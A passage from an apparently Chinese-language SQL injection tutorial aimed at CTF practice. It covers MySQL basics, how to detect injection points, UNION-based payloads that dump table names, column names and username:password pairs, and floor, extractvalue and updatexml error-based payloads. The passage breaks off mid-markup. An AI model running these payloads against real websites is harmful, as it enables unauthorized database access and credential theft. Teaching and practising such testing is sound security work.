库</em>（仅了解）：内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。</p><p>4、<em>sys 库</em>（仅了解）：通过这个数据库数据库，可以查询谁使用了最多的资源（基于IP或是用户）。哪张表被访问过最多等等信息。</p><h3 id="MySQL基础语法"><a href="#MySQL基础语法" class="headerlink" title="MySQL基础语法"></a>MySQL基础语法</h3><p>（不用很精通，<strong>会增删查改即可</strong>，sql注入会有一些特需的语法，<strong>都已列在下文“注入语法详解“模块</strong>）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 增 </span><br> <br><span class="hljs-comment">-- 创建一个名为 &#x27;test&#x27; 的数据库</span><br><span class="hljs-keyword">CREATE</span> DATABASE test;<br><span class="hljs-comment">-- 切换到 &#x27;test&#x27; 数据库</span><br>USE test;<br><span class="hljs-comment">-- 创建一个名为 &#x27;apple&#x27; 的表</span><br><span class="hljs-keyword">CREATE TABLE</span> apple (<br>    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span> AUTO_INCREMENT,  <span class="hljs-comment">-- 自增的主键字段 &#x27;id&#x27;</span><br>    kind <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT NULL</span>,          <span class="hljs-comment">-- 存储苹果种类的字段 &#x27;kind&#x27;</span><br>    soldtime <span class="hljs-type">DATE</span>                       <span class="hljs-comment">-- 存储销售时间的字段 &#x27;soldtime&#x27;</span><br>);<br> <br><span class="hljs-comment">-- 改</span><br> <br><span class="hljs-comment">-- 向 &#x27;apple&#x27; 表插入一条记录，包含 &#x27;id&#x27;, &#x27;kind&#x27; 和 &#x27;soldtime&#x27; 字段</span><br><span class="hljs-keyword">INSERT INTO</span> test.apple (id, kind, soldtime)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;将军苹果&#x27;</span>, <span class="hljs-string">&#x27;2024-10-1&#x27;</span>);<br><span class="hljs-comment">-- 在 &#x27;apple&#x27; 表中添加一个新的字段 &#x27;num&#x27;</span><br><span class="hljs-keyword">ALTER TABLE</span> test.apple <br><span class="hljs-keyword">ADD</span> num <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT NULL</span>;                   <span class="hljs-comment">-- &#x27;num&#x27; 字段用于存储数量，不允许为 NULL</span><br><span class="hljs-comment">-- 更新 &#x27;apple&#x27; 表中 id 为 1 的记录，将 &#x27;num&#x27; 字段的值设置为 12</span><br><span class="hljs-keyword">UPDATE</span> test.apple<br><span class="hljs-keyword">SET</span> num <span class="hljs-operator">=</span> <span class="hljs-number">12</span><br><span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br> <br><span class="hljs-comment">-- 删 </span><br> <br><span class="hljs-comment">-- 从 &#x27;apple&#x27; 表中删除 id 为 1 的记录</span><br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> test.apple<br><span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <br><span class="hljs-comment">-- 删除 &#x27;apple&#x27; 表</span><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> test.apple;<br><span class="hljs-comment">-- 删除 &#x27;test&#x27; 数据库</span><br><span class="hljs-keyword">DROP</span> DATABASE test;<br> <br><span class="hljs-comment">-- 查 </span><br> <br><span class="hljs-comment">-- 获取当前的日期和时间</span><br><span class="hljs-keyword">SELECT</span> NOW();<br><span class="hljs-comment">-- 获取当前使用的数据库名称</span><br><span class="hljs-keyword">SELECT</span> DATABASE();<br><span class="hljs-comment">-- 获取当前 MySQL 服务器的版本</span><br><span class="hljs-keyword">SELECT</span> VERSION();<br><span class="hljs-comment">-- 获取当前连接用户的信息</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>();<br><span class="hljs-comment">-- 获取 MySQL 数据目录的路径</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@datadir</span>;<br><span class="hljs-comment">-- 获取 MySQL 安装路径的基础目录</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@basedir</span>;<br><span class="hljs-comment">-- 获取 MySQL 编译时的操作系统信息</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version_compile_os</span>;<br><span class="hljs-comment">-- 切换到 &#x27;mysql&#x27; 数据库（系统数据库）</span><br>USE mysql;<br><span class="hljs-comment">-- 显示当前数据库中的所有表</span><br><span class="hljs-keyword">SHOW</span> TABLES;<br><span class="hljs-comment">-- 显示所有数据库</span><br><span class="hljs-keyword">SHOW</span> DATABASES;<br><span class="hljs-comment">-- 从信息架构中选择所有模式（数据库）名称</span><br><span class="hljs-keyword">SELECT</span> schema_name <span class="hljs-keyword">FROM</span> information_schema.SCHEMATA;<br><span class="hljs-comment">-- 查询信息架构中所有的模式（数据库）</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.schemata;<br><span class="hljs-comment">-- 查询信息架构中所有的表</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.tables;<br><span class="hljs-comment">-- 查询信息架构中所有的列</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.columns;<br><span class="hljs-comment">-- 查询 MySQL 用户表，获取用户信息</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> mysql.user;<br><span class="hljs-comment">-- 查询 &#x27;test&#x27; 数据库中的所有表名</span><br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-comment">-- 查询 &#x27;apple&#x27; 表中的所有列名</span><br><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;apple&#x27;</span>;<br><span class="hljs-comment">-- 查询 &#x27;apple&#x27; 表中的所有记录，包括 id, kind, num, soldtime 字段</span><br><span class="hljs-keyword">SELECT</span> id, kind, num, soldtime <span class="hljs-keyword">FROM</span> apple;<br><span class="hljs-comment">-- 查找 &#x27;root&#x27; 用户在 &#x27;LOCALHOST&#x27; 下的主机和用户</span><br><span class="hljs-keyword">SELECT</span> HOST, <span class="hljs-keyword">USER</span> <span class="hljs-keyword">FROM</span> mysql.user <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">AND</span> HOST <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;LOCALHOST&#x27;</span>;<br><span class="hljs-comment">-- 使用 UNION 查询信息架构中架构名称和目录名称</span><br><span class="hljs-keyword">SELECT</span> HOST, <span class="hljs-keyword">USER</span> <span class="hljs-keyword">FROM</span> mysql.user <br><span class="hljs-keyword">UNION</span> <br><span class="hljs-keyword">SELECT</span> CATALOG_NAME, SCHEMA_NAME <span class="hljs-keyword">FROM</span> information_schema.SCHEMATA;<br></code></pre></td></tr></table></figure><h2 id="SQL注入专项知识"><a href="#SQL注入专项知识" class="headerlink" title="SQL注入专项知识"></a>SQL注入专项知识</h2><h3 id="注入常识"><a href="#注入常识" class="headerlink" title="注入常识"></a>注入常识</h3><p><strong>一、什么是注入点</strong></p><p>实行注入的地方</p><p><strong>二、闭合的作用</strong></p><p>提交闭合符号，可以结束前一段查询语句，后面就可以加入其他SQL语句，查询我们需要的参数</p><p><strong>三、注释</strong></p><p>不需要的语句可以用注释符号’– ’或‘#’注释掉，利用注释符号暂时将程序段脱离运行（若在url中注入，需要进行URL转义，<code>--</code> 转义为 <code>--+’</code>，<code>#’</code>转义为 <code>%23’</code>）。</p><p><strong>简单来说，把某段程序“注释掉”，就是让它暂时不运行(而非删除掉)</strong></p><p><strong>四、如何判断是否存在注入漏洞</strong></p><p><strong>1、输入单引号</strong></p><p>输入单引号，页面报错，You have an error in your SQL syntax; ……（翻译为有SQL语法错误），那么基本存在注入漏洞</p><p><strong>2、输入双引号</strong></p><p>输入双引号，有时用双引号闭合时，输入单引号不会报错，需要输入双引号</p><p><strong>3、输入其他闭合符号（形式多样）</strong></p><p>根据不同的闭合，判断是否存在注入漏洞的方法也是不一样的，比如有时要输入’))或者”)，这时进行判断需要多次尝试，这个过程往往会和确定闭合符号步骤有部分重合。</p><p>**注意：凡是与数据库交互的地方，都有可能发生SQL注入。**所以我们需要测试的地方包括但不限于：</p><p>输入框（包括搜索框、评论框等），</p><p>传递的get、post参数（建议直接抓包找），</p><p>Referer、User-Agent、Cookie等http头传参。</p><p>我们必须认真全面地对上面各处进行仔细的测试，借以找到开发及维护人员的疏忽所在。</p><p><strong>五、注入的分类</strong></p><p><strong>1、按照查询字段：</strong></p><p><strong>数字型：</strong></p><p>当输入的参数为整型则为数字型注入</p><p><strong>字符型：</strong></p><p>当输入参数为字符串则为字符型注入</p><p><strong>2、按照注入方式：</strong></p><p>union注入、报错注入、布尔注入、时间注入、堆叠注入等</p><p><strong>3、按照请求方式：</strong></p><p>常见的有GET型注入与POST型注入，还有header注入、Cookie注入、Referer注入……。</p><p>GET型注入直接在URL上直接注入就可以（这就是GET传参方式），POST型有时可以直接在登录页面注入（注意是登录页面不是URL），但往往需要借助burpsuite、hackbar、postman或sqlmap等工具（具体使用方法见下文）</p><p>POST型注入、header注入、Cookie注入和Referer注入等的应对方法和get型差不多，主要是操作位置有所不同，然后各自有一点点独特的注入技巧。</p><p><strong>六、怎么判断是数字型注入还是字符型</strong></p><p><strong>（实际做题不需要我们刻板的先去判断是什么类型的注入，但我们发现这一步骤却往往是必不可少的，因为这一步实际上是判断闭合方式）</strong></p><p>方法一：<code>id=1 and 1=2;</code>若成功则是字符型，失败则是数字型。</p><p>（解释：数字型对比数值，1!&#x3D;2，报错；字符型用引号将数字、符号等包裹，视为字符串，and不会执行，就不会报错。但并不绝对，这一方法有时也不可靠）</p><p>方法二：<code>id=2-1;</code>如果可以运算则是数字型，如果不能运算则为字符型</p><p>方法三：<code>id=1‘</code>通过报错信息查看注入类型。输入的内容直接放入数据库里就是数字型注入，此时报错就是多了一个单引号<code>‘‘’</code>（我们这里用了3个单引号，因为1已经放入SQL语句里，单引号单独出来用以报错，注意报错时外面往往会再套一对单引号用来标注，所以共三个单引号）；但若报错是直接指出了我们整个的输入：<code>1‘</code>，加上数据库里已有的一对单引号和用来标注的一对单引号，表示为<code>‘’1‘‘’</code>，就是字符型注入。</p><p>方法四：当没有报错时，我们如何确定闭合方式？不断尝试，当发现使用某种闭合时，使下面这种情况成立，则该闭合正确：</p><p>闭合后不加注释无回显（假如有报错，此时应该是报错，但这里没报错，所以没有回显）；而加注释后有回显（注释成功代替掉后面的闭合，我们自己加的符号完美补上闭合，会产生我们想要的回显）</p><h3 id="注入语法详解"><a href="#注入语法详解" class="headerlink" title="注入语法详解"></a>注入语法详解</h3><p>（可以用到的时候再来了解一下，不需要先学完再继续）</p><p><strong>1、limit分页</strong></p><p><strong><code>limit n，m</code></strong>：从第n+1条往后取m条</p><p>例如，<code>limit 8，9</code>：从第9条数据往后取9条数据。</p><p><strong>2、count(*)</strong></p><p>统计数量，如果结合group by 就是统计分组的数量。</p><p><strong>3、合并函数：<code>concat()、concat_ws()、group_concat(arg)</code></strong></p><p><strong>concat()函数</strong></p><p>用于将多个字符串拼接到一起。MySQL的 CONCAT 函数是一个非常实用的字符串函数，用于将两个或多个字符串参数连接成一个单一的字符串。如果任何一个参数为 NULL，则 CONCAT 函数的结果也会是 NULL。这一点在构建包含潜在NULL值的数据库查询时特别重要，因为它可能影响到你的查询结果。</p><p>基本语法：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">CONCAT(<span class="hljs-built_in">string</span>1, <span class="hljs-built_in">string</span>2, ..., <span class="hljs-built_in">string</span>N)<br></code></pre></td></tr></table></figure><p>参数<code>string1, string2, …, stringN</code>：这些是要连接的字符串。你可以连接任意数量的字符串。</p><p><strong><code>concat_ws()</code></strong></p><p>用于将多个字符串拼接到一起，并在其之间插入指定的分隔符。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">concat_ws</span>(<span class="hljs-params">separator,str1,str2,......</span>)</span><br></code></pre></td></tr></table></figure><p><strong><code>group_concat(arg)</code> 函数</strong></p><p>可以合并多行的某列(或多列)数据为一行，默认以逗号分隔。</p><p>例如，</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930982.png"></p><p>有时会有分组函数和统计函数的组合使用，用于将一组字符串用指定的分隔符连接在一起，通常与group by 子句一起使用，以便在每个分组中连接字符串</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">group_concat( [<span class="hljs-keyword">distinct</span>] 要连接的字段 [<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排序字段 <span class="hljs-keyword">asc</span>/<span class="hljs-keyword">desc</span> ] [separator <span class="hljs-string">&#x27;分隔符&#x27;</span>] )<br></code></pre></td></tr></table></figure><p>    通过使用distinct可以排除重复值</p><p>    使用<code>order by</code>子句对结果中的值进行排序</p><p>    separator用于指定分隔符 ，如果缺少则默认为 逗号</p><p>注意：</p><p>       <code>group_concat</code>只有与group by语句同时使用才能产生效果。 所以使用<code>GROUP_CONCAT()</code>函数必须对源数据进行分组，否则所有数据会被合并成一行。</p><p><strong>4、mysql中相关语句的执行顺序</strong></p><p>（上面的比下面的优先执行）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span><br> <br><span class="hljs-keyword">from</span><br> <br><span class="hljs-keyword">where</span><br> <br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>    （具体作用在下一点）<br> <br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>     （具体作用在下下一点）<br></code></pre></td></tr></table></figure><p>由上可知，group by 比order by先执行，order by不会对group by 内部进行排序，如果group by后只有一条记录，那么order by 将无效。</p><p><strong>5、<code>GROUP BY</code> 分组</strong></p><p>group by一般用于分组统计，它表达的逻辑就是根据一定的规则，进行分组。</p><p><strong>6、<code>order by</code>排序</strong></p><p><code>ORDER BY</code> 关键字用于对结果集进行「排序」。</p><p><code>ORDER BY</code> 关键字可以按照列的「索引」进行排序，比如最左边第一列 username 的索引是 1，右边第二列 password列的索引是 2，依次类推…比如按照第1列排序（在SQL注入中可以确定列数，即注入点的字段数）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930481.png"></p><p><code>ORDER BY</code> 关键字默认按照「升序」对返回的结果集进行排序。如果需要按照「降序」对记录进行排序，可以使用 DESC 关键字。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930222.png"></p><p><strong>7、<code>RAND()和RAND(x)</code></strong></p><p>获取随机数的函数。</p><p><code>rand()</code>函数:随机返回0<del>1间的小数，rand()*2则随机返回0</del>2的小数</p><p><code>RAND(x)</code>返回一个随机浮点值v，范围在0到1之间(即0≤v≤1.0)。 若已指定一个整数参数x，则它被用作种子值，用来产生重复序列。</p><p>注：x与随机浮点值v不同，仅用于产生重复序列</p><p><strong>8、<code>floor()</code>函数</strong></p><p>小数向下取整数。</p><p><code>floor(rand(0)*2)</code>返回0或1两个数值。</p><p><strong>9、<code>substring()与substr()</code></strong></p><p><strong><code>substring()</code></strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">substring</span><span class="hljs-params">(str,m,n)</span></span><br></code></pre></td></tr></table></figure><p>从字符串的第m位开始，取出n位。</p><p>例如，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">substring</span>(<span class="hljs-number">123456</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>效果为：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930793.png"></p><p><strong><code>substr</code></strong> ：俗称字符截取函数</p><p>格式1：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">substr(string str, <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b);<br></code></pre></td></tr></table></figure><p>str  需要截取的字符串</p><p>a  截取字符串的开始位置（注：当a等于1时，从第一位开始截取；当a等于0时，无截取字符串）</p><p>b  要截取的字符串的长度</p><p>格式2：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">substr(string str, <span class="hljs-type">int</span> a) ;<br></code></pre></td></tr></table></figure><p>str  需要截取的字符串</p><p>a  可以理解为从第a个字符开始截取后面所有的字符串。</p><p><strong>10、<code>ASCII()</code></strong></p><p>MySQL中ASCII() 函数的语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ASCII</span><span class="hljs-params">(character)</span></span><br></code></pre></td></tr></table></figure><p>参数character：必需的。 要返回 ASCII 值的字符。 如果多于一个字符，它将只返回第一个字符的 ASCII 值。</p><p>返回值：<code>MySQL ASCII()</code> 函数返回给定的字符串的第一个字符的 ASCII 值。如果参数 character 为 NULL，它将返回 NULL。</p><p><strong>11、<code>if()</code>函数的使用</strong></p><p>IF函数根据判断条件是否成立进行选择执行，成立时执行一条语句，不成立时执行另一条语句。</p><p>语法结构:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">IF</span><span class="hljs-params">(condition, value_if_true, value_if_false)</span></span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>condition: 判断条件</p><p>value_if_true: 如果condition的结果为TRUE，返回该值</p><p>value_if_false: 如果condition的结果为FALSE，返回该值</p><p><strong>12、<code>sleep()</code></strong></p><p><code>sleep(int m)</code>：延时m秒</p><p><strong>13、<code>LOAD_FILE()</code>函数</strong></p><p>在mysql中，<code>load\_file()</code>函数读取一个文件并将其内容作为<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020" title="字符串">字符串</a>返回。</p><p>语法：<code>load_file(file_name)</code>，其中file_name是文件的完整路径。</p><p>SQL语句为</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">SELECT</span> <span class="hljs-function"><span class="hljs-title">LOAD_FILE</span>(<span class="hljs-string">&#x27;文件路径/文件名&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>效果如下（注意，文件路径符号必须使用斜线&#x2F;，不可以使用反斜线\）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930516.png"></p><h2 id="手动注入方式及步骤"><a href="#手动注入方式及步骤" class="headerlink" title="手动注入方式及步骤"></a>手动注入方式及步骤</h2><h3 id="UNION联合查询注入"><a href="#UNION联合查询注入" class="headerlink" title="UNION联合查询注入"></a>UNION联合查询注入</h3><p><strong>一、原理</strong></p><p>union select 是合并两个或多个表查询的结果集，如果我们将查询语句前面的表设为不存在的表，那么查询结果就返回了后续的表，充分利用可以回显我们的目标表格的内容。</p><p>如果前面的查询语句查询的是数值，我们可以通过设为-1等操作，使其不存在，从而只显示union后面我们操纵的内容</p><p><strong>二、步骤</strong></p><p>1、先判断有无漏洞，比如输入单引号（见上文）</p><p>2、判断是字符型注入还是数字型注入（即判断闭合方式）</p><p>3、判断字段数，并且确定各字段在回显的位置。用union select 1,2,3,……尝试，若有四个字段，在union select 1,2,3,4 时会显示成功；然后使union之前的语句错误，这样就可以看我们select出来的1，2，3，4分别在回显中的位置</p><p>4、在有回显的位置爆表名，例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>5、爆列名（字段名），例如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>6、爆用户数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-string">&#x27;:&#x27;</span>,password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p><strong>一、定义及分类</strong></p><p>报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。是一种页面响应形式。报错注入用于有error回显，且能从报错中获得有用信息的情况。</p><p><strong>分类（重点掌握前3种，其余了解即可）</strong></p><ol><li>通过floor()报错注入</li><li>通过extractValue()报错注入</li><li>通过updateXml()报错注入</li><li>通过NAME_CONST()报错注入</li><li>通过jion()报错注入</li><li>通过exp()报错注入</li><li>通过geometryCollection()报错注入</li><li>通过polygon()报错注入</li><li>通过multipoint()报错注入</li><li>通过multlinestring()报错注入</li><li>通过multpolygon()报错注入</li><li>通过linestring()报错注入</li></ol><p><strong>二、常用的报错注入（前三种重点掌握，剩下的了解即可）</strong></p><p><strong>1、通过 floor（）报错注入：</strong></p><p>通过注入语法详解我们已知，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> rand();    随机返回<span class="hljs-number">0</span>~<span class="hljs-number">1</span>间的小数<br> <br><span class="hljs-attribute">SELECT</span> rand()*<span class="hljs-number">2</span>;    随机返回<span class="hljs-number">0</span>~<span class="hljs-number">2</span>间的小数<br> <br><span class="hljs-attribute">SELECT</span> rand() FROM users;    根据users的行数随机显示结果<br> <br><span class="hljs-attribute">SELECT</span> floor(rand()*<span class="hljs-number">2</span>) FROM users;    向下取整结果为<span class="hljs-number">0</span>或<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>下面我们看一下 floor（）报错注入的例句，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>在执行group by语句的时候，group by语句后面的字段会被运算两次。</p><p>第一次是group by后面的字段和虚拟表进行对比，第二次是插入时会进行运算。</p><p>由于rand()函数的随机性，导致第二次运算可能和第一运算结果不一致，运算的结果存在，这时插入就会出错。</p><p>其实就是rand()函数进行grand by分组时会多次执行，导致键值key重复</p><p>注意：用<code>information_schema.tables</code>是因为这个数据库是一定已知存在的且内容多有足够的统计结果</p><p><strong>2、通过extractValue()报错注入：</strong></p><p><code>extractvalue()</code>函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">EXTRACTVALUE (XML_document, XPath_string);<br></code></pre></td></tr></table></figure><p>第一个参数：XML_document是String格式，为XML文档对象的名称</p><p>第二个参数：XPath_string (Xpath格式的字符串)，查询路径</p><p>注：查询参数路径写错时，查询不到内容，但不会报错；把查询参数格式符号写错时提示报错信息。</p><p>由上可知，当我们特意让查询出语法错误，会显示  </p><p><code>XPATH syntax error : ’~XPath_string的内容’  </code></p><p>我们可以把XPath_string作为注入点，显示出我们想要的信息，如下例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>（0x7e是~的ASCII码）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021930731.png"></p><p>然后，爆表名 -&gt;爆列名-&gt;爆用户数据</p><p>（具体语句请查看sql-labs里的详例）</p><p><strong>3、通过updateXml()报错注入：</strong></p><p>extractvalue是查询，而updatexml是修改。但是用法和extractvalue是一样的。</p><p>updatexml函数：</p><p>    <code>UPDATEXML</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UPDATEXML (XML_document, XPath_string, new_value);<br></code></pre></td></tr></table></figure><p>第一个参数：XML_document是String格式，为XML文档对象的名称</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，不满足Xpath格式的字符串都会产生报错。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>例句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())),<span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>效果为</p><p><img 